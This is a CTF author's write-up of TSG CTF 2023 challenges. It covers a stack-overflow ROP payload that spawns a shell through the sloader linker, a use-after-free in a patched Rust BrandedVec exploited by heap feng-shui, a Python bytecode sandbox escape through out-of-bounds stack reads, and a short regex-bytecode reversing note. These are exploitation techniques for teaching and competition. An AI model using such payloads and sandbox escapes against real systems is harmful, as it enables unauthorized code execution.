# TSG CTF 2023 Author's writeup

Thank you for your participation in TSG CTF 2023! This post gives you my writeups for the challenges that I created.

- sloader (pwnable)
- 👻 (pwnable)
- bypy (pwnable)
- Conduit (reversing)

Note that the writeup in this repo is a temporary one, and the final version will be published in the official archive repository in [https://github.com/tsg-ut/](https://github.com/tsg-ut).


## sloader

### Problem Setting

You are given a binary, which you might think is unsolvable.

```
$ cat chall.c
#include <stdio.h>

int main(void) {
    char buf[16];
    scanf("%s", buf);
    return 0;
}
$ checksec --file=chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

However, the server executes the binary by using [`sloader`](https://github.com/akawashiro/sloader) as a dynamic linker (not ld)!

### Solution

If you execute the binary with sloader, you might notice that even though the binary says it's PIE, the address of the binary loaded is always the same, which often happens in some non-standard environments.

```
gef> vmmap
[ Legend:  Code | Heap | Stack | Writable | NONE | RWX ]
Start              End                Size               Offset             Perm Path
0x0000000001400000 0x0000000001401000 0x0000000000001000 0x0000000000000000 rw- /dev/zero (deleted)
0x0000000001401000 0x0000000001402000 0x0000000000001000 0x0000000000000000 rwx /dev/zero (deleted)
0x0000000001402000 0x0000000001403000 0x0000000000001000 0x0000000000000000 rw- /dev/zero (deleted)
0x0000000001403000 0x0000000001405000 0x0000000000002000 0x0000000000000000 rw- /dev/zero (deleted)
0x0000000010000000 0x0000000010001000 0x0000000000001000 0x0000000000000000 r-- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader
0x0000000010001000 0x0000000010263000 0x0000000000262000 0x0000000000001000 r-x /home/ubuntu/tsgctf4/pwn/sloader/src/sloader  <-  $rcx, $rip
0x0000000010263000 0x00000000102e4000 0x0000000000081000 0x0000000000263000 r-- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader
0x00000000102e4000 0x00000000102f1000 0x000000000000d000 0x00000000002e3000 r-- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader
0x00000000102f1000 0x00000000102f4000 0x0000000000003000 0x00000000002f0000 rw- /home/ubuntu/tsgctf4/pwn/sloader/src/sloader  <-  $rbx, $rbp, $r12, $r15
0x00000000102f4000 0x000000001030f000 0x000000000001b000 0x0000000000000000 rw-
0x000000001107f000 0x00000000110d0000 0x0000000000051000 0x0000000000000000 rw- <tls>  <-  $rsi, $r9
0x00007fdccfd75000 0x00007fdccfd79000 0x0000000000004000 0x0000000000000000 rwx /home/ubuntu/tsgctf4/pwn/sloader/src/chall
0x00007fdccfd79000 0x00007fdccfd7d000 0x0000000000004000 0x0000000000000000 rwx /home/ubuntu/tsgctf4/pwn/sloader/src/chall
0x00007ffcf992e000 0x00007ffcf994f000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $rsp
0x00007ffcf99d6000 0x00007ffcf99da000 0x0000000000004000 0x0000000000000000 r-- [vvar]
0x00007ffcf99da000 0x00007ffcf99dc000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
```

Another interesting point for this linker is how the libc address is resolved.
Let's see what happens how `scanf` in `main` is resolved.
In the middle of scanf, the backtrace is like this

```
gef> bt
#0  0x00000000101f05c2 in read ()
#1  0x0000000010148121 in _IO_new_file_underflow ()
#2  0x000000001014b7a7 in _IO_default_uflow ()
#3  0x00000000101317c0 in __vfscanf_internal ()
#4  0x0000000010130d5f in __isoc99_scanf ()
```
so, `scanf` is located at the strange address `0x0000000010130d5f`. What is this? This is located in the mapped region with a fixed address.
In fact, all the functions in glibc seem to be mapped in the sloader's region.

https://github.com/akawashiro/sloader/blob/0744fde8deab2c3269c11e1075d13c5cc80a82e5/libc_mapping.cc#L281

```
0x0000000010001000 0x0000000010263000 0x0000000000262000 0x0000000000001000 r-x /home/ubuntu/tsgctf4/pwn/sloader/src/sloader  <-  $rcx, $rip
```

This means we don't have to leak any address to bypass ALSR.

Now the problem is how do I bypass the stack canary? If you try to input a large buffer (like "A" * 100) to it, you will notice that you can overwrite the return address!

```
0x7ffc3d465a08|+0x0000|000: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'[...]  <-  retaddr[1]  <-  $rsp
```
So now we can pwn this chall just by a simple ROP payload:
```
system_addr = 0x1012c960
binsh = 0x10270563
pop_rdi = 0x10009132
ret = pop_rdi + 1

padding = b"A" * 40

payload = [
    ret,
    pop_rdi,
    binsh,
    system_addr,
]

payload = padding + b''.join(map(p64, payload))

```

Why? You don't have to understand why and just do ROP, but let us see what happens. If you go through the source code of sloader, you may notice there is a mapping between the symbols of libc and actual implementations [here](https://github.com/akawashiro/sloader/blob/master/libc_mapping.cc). And the implementation for `stack_chk_fail` is

```
#define DEFINE_DUMMY_FUN(name) \
    void sloader_##name() {    \
        ;                      \
    }
// #define DEFINE_DUMMY_FUN(name) void sloader_##name(){ RAW_PRINT_STR(#name); }

/** ommitted **/

DEFINE_DUMMY_FUN(__stack_chk_fail)
```

`stack_chk_fail` does nothing other than return, so you can freely overwrite the stack canary!

Final payload is here:

## 👻 (pwn, med, 3 solves)


### Problem Statement
```
Ghost state is useful for proving some invariants on programs 👻🎃

The source code is partially taken from here.

nc 35.187.211.114 40007
```


### Problem Setting

You are given a user-land program written in Rust that utilizes a strange data structure `BrandedVec`. The application itself is a simple menu application where you can add notes, remove notes, modify notes, "pin" notes, etc.

```
$ nc localhost 40007
1. post tweet
2. undo tweet
3. pin tweet
4. print pinned tweet
5. modify pinned tweet
6. move pinned tweet
7. exit
> 1
tweet > Hello
> 3
id > 1
> 4
Hello

> 1
tweet > sup
> 6
older[0] / newer[1] > 1
size > 1
> 4
sup

> 5
tweet > Bye
> 4
Bye

> 7
```

Let us see the source code in detail.

```rust
fn main() {
    Twitter::new(|mut twitter| {
        twitter.show_menu();
        let mut cont = true;
        while cont {
            cont = twitter.handle();
        }
    });
}
```

This is a main function, and loops until `twitter.handler()` returns `false`. I also picked some functionalities of `Twitter` as follows:
```rust

struct Twitter<'id> {
    tweets: BrandedVec<'id, String>,
    pinned: BrandedIndex<'id>,
}

impl<'id> Twitter<'id> {
    ...
    fn post_tweet(&mut self) {
        print_str("tweet > ");
        let mut buf = [0u8; 280];
        let size = read_string(&mut buf);
        let tweet = unsafe { std::str::from_utf8_unchecked(&buf[..size]) };
        self.tweets.push(tweet.to_string());
    }
    fn undo_tweet(&mut self) {
        self.tweets.pop();
    }
...
    fn move_pin_tweet(&mut self) {
        print_str("older[0] / newer[1] > ");
        let old_new = get_usize();
        print_str("size > ");
        let id = get_usize();

        if old_new == 1 {
            self.pinned = self
                .tweets
                .get_index(self.pinned + id)
                .expect("no such tweet");
        } else {
            self.pinned = self.pinned - id;
        }
        assert!(self.sanity_check());
    }
```
`post_tweet` creates a new tweet, `undo_tweet` seems to pop the latest tweet, `move_pin_tweet` can move the current pinned tweet to another one. To manage tweets and pinned tweets, this service utilizes strange data structures: `BrandedVec` and `BrandedIndex`. Now the question is what are they?

### Ghost State

Let us move to talking about how the data structures are designed and implemented. We first see the original implementation of `BrandedVec` and why it's considered to be sound, then look at the modification to it.

Since Rust always bound-checks accesses to a vector, within the safe world of Rust, OOB accesses (unless their interfaces are unsound) always cause a panic. Basically, proving the safety of index accesses is a difficult problem (undecidable problem), but sometimes we can easily prove the safety. Consider the following program:

```rust
let v = vec![1, 2, 3];
let w = vec![1];
let idx = 2;
let x = v[idx];
// Wish to remove the boundary check this time since we already know it's safe.
let y = v[idx];
// but we don't want to remove the boundary check for the following
let z = w[idx];
println!("{}", x + y + z);
```

`BrandedVec` aims to tackle this problem. Given a `BrandedVec` `v`, their APIs provide with us

- Boundary checked indices `BrandedIndex` for v
- Simple vector manipulations like insert / read / write (/ iter)

`BrandedIndex` can understand which vector they belong to; i.e., given two `BrandedVec`s v and w, and `BrandedIndex` i for v, you can access the i-th element of v without any boundary-checks, but cannot use i to access the i-th element of w. This is guaranteed by <strong>the life type system of Rust</strong>; therefore, we can find the invalid use of `BrandedIndex` <strong>statically</strong>. Cool.
If you are interested in further details, you can refer to the Ghost Cell paper [[Yanovski+ ICFP21]](https://dl.acm.org/doi/10.1145/3473597). ((Have you ever heard of Ghost Cell in Rust? This mechanism is the basis for achieving the data structure.))


### Implementation of BrandedVec

Not interested in the theory? OK. Let me talk about how it's implemented. `BrandedVec` is in fact, just a vector that is defined as
```rust
#[derive(Clone, Copy, Default)]
struct InvariantLifetime<'id>(PhantomData<*mut &'id ()>);

struct BrandedVec<'id, T> {
    inner: Vec<T>,
    _marker: InvariantLifetime<'id>,
}
```
(The original source for `BrandedVec` is taken from [here](https://gitlab.mpi-sws.org/FP/ghostcell/-/blob/134581ab18072528de50ac67c7f7ab89face9671/ghostcell/examples/branded_vec.rs), which is a PoC repository for [[Yanovski+ ICFP21]](https://dl.acm.org/doi/10.1145/3473597))

`InvariantLifetime<'id'>` is a tag for identifying vectors, and the data itself is contained in `inner`.
`BrandedVec` has the following interfaces:

```
    pub fn new<R>(inner: Vec<T>, f : impl for<'id2> FnOnce(BrandedVec<'id2, T>) -> R) -> R {
        let branded_vec = BrandedVec {
            inner,
            _marker: InvariantLifetime::new()
        };
        f(branded_vec)
    }

    pub fn get_index(&self, index: usize) -> Option<BrandedIndex<'id>> {
        if index < self.inner.len() {
            Some(BrandedIndex {
                idx: index,
                _marker: InvariantLifetime::new(),
            })
        } else {
            None
        }
    }

    pub fn get(&self, index: BrandedIndex<'id>) -> &T {
        unsafe {
            self.inner.get_unchecked(index.idx)
        }
    }

    pub fn get_mut<'a>(&'a mut self, index: BrandedIndex<'id>) -> &'a mut T {
        unsafe {
            self.inner.get_unchecked_mut(index.idx)
        }
    }

    pub fn push<'a>(&'a mut self, val: T) -> BrandedIndex<'id> {
        let index = BrandedIndex {
            idx: self.inner.len(),
            _marker: InvariantLifetime::new(),
        };
        self.inner.push(val);
        index
    }
```

Focus on `get_index`. This method returns BrandedIndex when `index` is in the vector; otherwise, it returns None. Since `BrandedVec` does not shrink, once `index` is proven to be in the vector, the access with the index to the vector is always safe in the future.


### Patch to the `BrandedVec`

Now let us see the patch to this data structure. First, we introduce a new interface, `pop`, and patched `get_index` so that it memorizes the maximum index with which `self` was accessed so far. In `pop` method, the vector pops only when the length of the vector is greater than `self.max_index + 1`. This can be justified because any `BrandedIndex` `bi` that has been published so far does not point to the element that is to be popped out.
Correct, isn't it? I think so.

```rust
    pub fn get_index(&mut self, index: usize) -> Option<BrandedIndex<'id>> {
        if index < self.inner.len() {
            if self.max_index < index {
                self.max_index = index;
            }
            Some(BrandedIndex {
                idx: index,
                _marker: InvariantLifetime::new(),
            })
        } else {
            None
        }
    }
...
    pub fn pop<'a>(&'a mut self) {
        if self.inner.len() > self.max_index + 1 {
            self.inner.pop();
        } else {
            panic!("failed to pop")
        }
    }
```

Another patch I introduced is the index manipulations with the `+` and `-` operators.
```rust

impl<'id> std::ops::Sub<usize> for BrandedIndex<'id> {
    type Output = Self;

    fn sub(mut self, rhs: usize) -> Self::Output {
        self.idx -= rhs;
        self
    }
}

impl<'id> std::ops::Add<usize> for BrandedIndex<'id> {
    type Output = usize;

    fn add(self, rhs: usize) -> Self::Output {
        self.idx + rhs
    }
}
```
Assume that we have BrandedIndex `i` which points to `index`-th element of a vector `v`. Since we have `i`, the length of `v` is greater than or equal to `i`. Therefore, we can safely say that `i - n` is also safe. Isn't it?

Compared with subtraction, addition should be dangerous, so the operation just returns an unproved index.

### Bug

You may notice this `Sub` is dangerous if integer overflow happens. To mitigate tha situation, we introduced the following `satity_check` every time `Sub` operation happens so that we can make sure that the resulting index is between [0, v.len()):
```rust
    pub fn sanity_check(&self, index: BrandedIndex<'id>) -> bool {
        index.idx < self.inner.len()
    }

```

However, combined with `pop` operation that we newly introduced, `BrandedVec` is still unsafe. For example,
```rust
// Assume v is BrandedVec [1,2,3], max_index = 0
let idx = v.get_index(1).unwrap(); // max_index = 1
let idx2 = idx - 0xffffffffffffffffu64
v.pop(); // max_index = 1, so 3 is popped
v.get(idx2) // UAF!
```

Note that the binary is compiled with `--release` flag, so the integer overflow check is disabled.

### Solution

If you notice what happens, this challenge is a simple heap feng-shui challenge against a Rust binary. You have to be aware of the structure of `String` and `Vec`, but this is almost similar to the mechanism that can be seen in other languages like C++'s standard library.

My strategy is to
1. leak a heap address and a libc address by UAF read
2. create a fake chunk just above the Vec that holds tweets
3. overwrite tweets vector to read arbitrary addresses, which leads to reading `environ` in libc
4. overwrite the return address of `main` with ROP payload

Since String and some other functionalities in Rust can allocate heap buffers internally, you have to be careful about that.

## bypy　(pwn, hard, 4 solves)

```
Another Python sandbox? This time, you have to pwn python bytecode interpreter. Can you get out of the sandbox?

nc 35.187.211.114 40003
```

### Problem Setting

You are given a Python program as follows:
```py
from base64 import b64decode
from marshal import loads

NMAX = 10000


def validator(c):
    if len(c.co_names) != 0:
        return False
    if len(c.co_consts) != 0:
        return False
    if len(c.co_cellvars) != 0:
        return False
    if len(c.co_freevars) != 0:
        return False
    if len(c.co_varnames) != 0:
        return False
    return True


def dummy():
    pass


# :)
for key in ["eval", "exec", "__import__", "open"]:
    del __builtins__.__dict__[key]


def main():
    global __builtins__
    print("Give me your source: ")
    src = input()
    if len(src) > NMAX:
        print("too long")
        exit(-1)

    c = b64decode(src)
    code = loads(c)
    if not validator(code):
        print("invalid code")
        exit(-1)

    dummy.__code__ = code

    print(dummy())


main()
```

This script just takes a bytecode and executes it. Note that if the byte code contains constants, variable names, or other stuff, the script just exits without executing the bytecode.

So this challenge asks you "can you pwn bytecode interpreters?"

### Approach to Pwn

There is a huge attack surface, so there should be various ways to pwn this interpreter. Note that I think the Python bytecode sandbox interpreter is complete in terms of the specification; you have to use some "undefined behavior" like out-of-bounds access.
[Satoooon](https://discord.com/channels/546339917459095552/1165469713720152124/1170639277076516925) exploited `LOAD_FAST`'s out-of-bounds access, which leads to obtaining `exec` functions and `src` variable in the stack utilized by the bytecode executed prior to our bytecode.

I exploited `POP` operation, which can copy an object from the stack below. This does not check the boundary of the stack; you can just get an object from the stack frame in the main function.
In this way,  you can obtain the string in `src`, `b64decode` function and `loads` function.

Another important thing is that Python's `marshal.loads` works correctly even when there are some redundant bytes not to be read at the end of the byte. For example, the following snippet correctly works:
```py
>>> import marshal
>>> data = marshal.dumps(b"ABCD")
>>> marshal.loads(data + b"EFGH")
b'ABCD'
```

Therefore, you can attach some other data at the end of the source code we will send.

Wrapping up everything, what we want to do is `make_function(loads(b64decode(src[a:])))()` where `a` is the actual length of the (first) bytecode object.

## Conduit (rev, med, 2 solves)

This is a simple bytecode-reversing challenge.
You will find that the binary loads the internal bytecodes for regex library. What you have to do is to retrieve the bytecodes, parse the data, and finally search for the string that the automaton accepts by using depth-first search or something.

